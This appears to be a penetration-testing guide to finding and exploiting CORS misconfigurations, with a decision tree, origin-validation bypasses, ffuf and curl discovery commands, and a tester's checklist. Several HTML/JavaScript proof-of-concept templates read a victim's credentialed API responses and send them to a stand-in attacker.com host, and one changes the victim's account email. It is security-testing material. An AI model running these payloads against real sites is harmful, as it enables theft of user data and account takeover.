# CORS Misconfiguration Decision Tree

## How CORS Works

Browser sends cross-origin request. If it's a simple request (GET/POST with basic headers), browser sends it and checks the response headers. If it's a preflighted request (PUT/DELETE, custom headers, JSON content-type), browser sends OPTIONS first.

Key response headers:
```
Access-Control-Allow-Origin: https://trusted.com
Access-Control-Allow-Credentials: true
Access-Control-Allow-Methods: GET, POST
Access-Control-Allow-Headers: Content-Type, Authorization
```

The browser enforces CORS. The server still processes the request regardless — CORS only controls whether the browser gives your JavaScript the response. Server-side impact (writes, deletes, state changes) happens either way.

---

## Decision Tree

### Step 1: Does the server reflect your Origin?

Send:
```
GET /api/user HTTP/1.1
Host: target.com
Origin: https://attacker.com
Cookie: session=...
```

Check response for:
```
Access-Control-Allow-Origin: https://attacker.com
```

**If yes, go to Step 2.**
**If no:** Check if it reflects a null origin or uses a wildcard (Step 3).

---

### Step 2: Does it also send `Allow-Credentials: true`?

```
Access-Control-Allow-Origin: https://attacker.com
Access-Control-Allow-Credentials: true
```

**If both present: exploitable.** Attacker's origin is trusted and cookies/auth headers are included.

PoC:
```html
<script>
fetch("https://target.com/api/user", {
  credentials: "include"
})
.then(r => r.text())
.then(data => {
  fetch("https://attacker.com/collect?d=" + btoa(data));
});
</script>
```

**If `Allow-Origin` reflects but no `Allow-Credentials`:** Cookies not sent. Only useful if the endpoint returns data accessible without auth, or if you can find an endpoint that doesn't require auth but still returns useful data.

---

### Step 3: Wildcard

```
Access-Control-Allow-Origin: *
```

Wildcard with credentials is invalid per spec — browsers reject it. So `* + credentials` is not exploitable from a browser.

Wildcard without credentials: any origin can read the response, but without cookies. Only matters for unauthenticated endpoints that return sensitive data.

---

### Step 4: Null Origin

Send:
```
Origin: null
```

Response:
```
Access-Control-Allow-Origin: null
Access-Control-Allow-Credentials: true
```

Browsers send `null` origin from sandboxed iframes, `file://`, redirects. Exploitable:

```html
<iframe sandbox="allow-scripts allow-top-navigation allow-forms" src="data:text/html,
<script>
fetch('https://target.com/api/user', {credentials: 'include'})
.then(r => r.text())
.then(d => top.location='https://attacker.com/collect?d='+btoa(d))
</script>">
</iframe>
```

---

## Validation Bypass Patterns

When the server does validation but does it wrong.

### Prefix match
Server checks if origin starts with `https://target.com`:
```
# Registered: target.com
# Bypass:
Origin: https://target.com.attacker.com
```

### Suffix match
Server checks if origin ends with `target.com`:
```
# Bypass:
Origin: https://attackertarget.com
Origin: https://notreallytarget.com
```

### Contains match
Server checks if origin contains `target`:
```
# Bypass:
Origin: https://attacker.com/?x=target.com
# (some parsers are sloppy about this)
```

### Regex escape
If server uses regex: `^https://target\.com$` -- correct. But often written as `^https://target.com$` (dot not escaped):
```
# Bypass:
Origin: https://targetXcom  (X matches unescaped dot)
```

### HTTP vs HTTPS
Server allows `https://target.com`. Test:
```
Origin: http://target.com
```
If accepted, MITM on HTTP can inject malicious page that makes credentialed requests.

### Subdomain wildcard
Server allows any subdomain: `*.target.com`. If any subdomain has XSS or is takeable:
```
Origin: https://subdomain.target.com
```
XSS on `subdomain.target.com` can make credentialed requests to the main app.

### Unregistered subdomain
If subdomain `staging.target.com` no longer resolves but CORS still allows it -- subdomain takeover, then use as trusted origin.

---

## Exploitability Matrix

| Allow-Origin | Allow-Credentials | Cookies sent | Exploitable |
|---|---|---|---|
| Reflects origin | true | Yes | Yes |
| Reflects origin | false/absent | No | Only unauthenticated endpoints |
| `*` | true | No (browser blocks) | No |
| `*` | false/absent | No | Only public data |
| `null` | true | Yes (sandboxed iframe) | Yes |
| `null` | false/absent | No | Only public data |
| Hardcoded trusted | true | Yes (if you control trusted origin) | Conditional |

---

## Finding CORS Misconfigurations

### Manual
Add `Origin: https://attacker.com` to every request in Burp. Look for reflection in response headers. Filter responses on `Access-Control-Allow-Origin`.

### Automated
```bash
# ffuf to fuzz origins
ffuf -u https://target.com/api/FUZZ -H "Origin: https://attacker.com" \
     -w /dev/null -mr "Access-Control-Allow-Origin: https://attacker.com"

# curl loop across endpoints
for endpoint in /api/user /api/admin /api/data; do
  echo -n "$endpoint: "
  curl -si "https://target.com$endpoint" \
    -H "Origin: https://attacker.com" \
    -H "Cookie: session=YOUR_SESSION" \
    | grep -i "access-control"
done
```

### What to check per endpoint
- Authenticated endpoints (CORS + credentials = account data theft)
- Password change / email change endpoints (CORS + CSRF-like impact)
- Token/key endpoints (API keys, OAuth tokens)
- Admin endpoints

---

## Impact Assessment

**High:** Reflects arbitrary origin + credentials: true on authenticated endpoint. Full account takeover potential. Attacker hosts page, victim visits, attacker's JS reads victim's data/tokens.

**Medium:** Reflects arbitrary origin + credentials: true on write endpoint without CSRF token. Attacker can trigger state changes (email change, password reset initiation, data deletion) cross-origin.

**Low:** Wildcard on public unauthenticated endpoint. Any origin can read it but there are no credentials so the data is already public.

**Conditional:** Trusted origin with subdomain wildcard. Impact depends on whether attacker can get execution on a trusted subdomain (XSS, subdomain takeover).

---

## PoC Templates

### Read sensitive data
```html
<!DOCTYPE html>
<html>
<body>
<script>
var target = "https://target.com/api/account";
var exfil = "https://attacker.com/collect";

fetch(target, {credentials: "include"})
  .then(r => r.json())
  .then(data => {
    fetch(exfil + "?data=" + btoa(JSON.stringify(data)));
  })
  .catch(e => console.log(e));
</script>
</body>
</html>
```

### Chain with CSRF (write endpoint)
```html
<script>
fetch("https://target.com/api/change-email", {
  method: "POST",
  credentials: "include",
  headers: {"Content-Type": "application/json"},
  body: JSON.stringify({email: "attacker@evil.com"})
})
.then(r => r.text())
.then(d => fetch("https://attacker.com/log?r=" + btoa(d)));
</script>
```

### Null origin via sandboxed iframe
```html
<iframe sandbox="allow-scripts" srcdoc="
<script>
fetch('https://target.com/api/user', {credentials: 'include'})
  .then(r => r.text())
  .then(d => {
    var img = new Image();
    img.src = 'https://attacker.com/c?d=' + encodeURIComponent(d);
  });
</script>
"></iframe>
```

---

## Checklist

```
[ ] Send Origin: https://attacker.com on authenticated endpoints
[ ] Check for reflection in ACAO header
[ ] If reflected, check for ACAC: true
[ ] Try Origin: null
[ ] Try Origin: http://target.com (HTTP variant)
[ ] Try Origin: https://target.com.attacker.com (prefix bypass)
[ ] Try Origin: https://attackertarget.com (suffix bypass)
[ ] Enumerate subdomains, check if any are allowed origins
[ ] Check if any allowed subdomains have XSS or are takeable
[ ] Test unauthenticated endpoints with wildcard (data sensitivity?)
[ ] Test write endpoints: is CORS + no CSRF token = CSRF via CORS?
[ ] Verify with PoC page before reporting
```
